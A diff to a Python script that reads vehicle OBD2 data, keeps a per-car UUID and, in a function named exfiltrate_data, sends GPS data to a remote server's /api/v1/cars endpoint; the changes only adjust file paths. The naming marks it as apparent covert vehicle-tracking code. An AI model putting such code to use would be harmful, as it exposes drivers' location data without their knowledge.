@@ -107,16 +107,17 @@ def _get_car_uuid():
     if len(car_uuid) > 0:
         return car_uuid
 
-    if os.path.isfile(uuid_file):
+    uuid_file_path = os.getcwd() + os.sep + uuid_file
+    if os.path.isfile(uuid_file_path):
         try:
-            with open(uuid_file, mode='r') as infile:
+            with open(uuid_file_path, mode='r') as infile:
                 car_uuid = infile.readlines()[0]
         except:
             car_uuid = ""
 
     if len(car_uuid) <= 0:
         car_uuid = uuid.uuid4().hex
-        with open(uuid_file, mode='w') as infile:
+        with open(uuid_file_path, mode='w') as infile:
             infile.write(car_uuid)
     return car_uuid
 
@@ -148,7 +149,7 @@ def exfiltrate_data(data):
     global server_url
     global car_uuid
     _output_message("Sending GPS data...")
-    with open(exported_data_file, "a+") as f:
+    with open(memory_folder + os.sep + exported_data_file, "a+") as f:
         f.write(json.dumps(data)+"\n\n")
     url = server_url + "/api/v1/cars"
     car_uuid = _get_car_uuid()
@@ -196,7 +197,8 @@ def run():
     rpm = -1
     intake_air_temperature = -1
     while 1:
-        with open(obd2_csv_file, mode='r') as infile:
+        csv_file_path = os.getcwd() + os.sep + obd2_csv_file
+        with open(csv_file_path, mode='r') as infile:
             reader = csv.DictReader(infile)
             if os.path.isfile(stop_file):
                 break
